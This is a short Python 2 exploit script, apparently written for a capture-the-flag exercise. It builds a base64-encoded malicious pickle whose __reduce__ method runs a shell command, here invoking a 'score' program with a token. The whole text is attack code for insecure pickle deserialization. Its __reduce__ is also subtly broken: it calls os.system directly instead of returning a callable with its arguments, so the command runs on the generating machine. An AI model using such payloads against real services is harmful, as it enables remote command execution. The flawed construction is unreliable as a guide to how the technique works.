import cPickle, os, base64

class Blah(object):
    def __reduce__(self):
        return (os.system("/bin/bash -i /usr/local/bin/score 03031824-841d-47c6-9cec-5144b3087f28 "))

print base64.b64encode(cPickle.dumps(Blah()))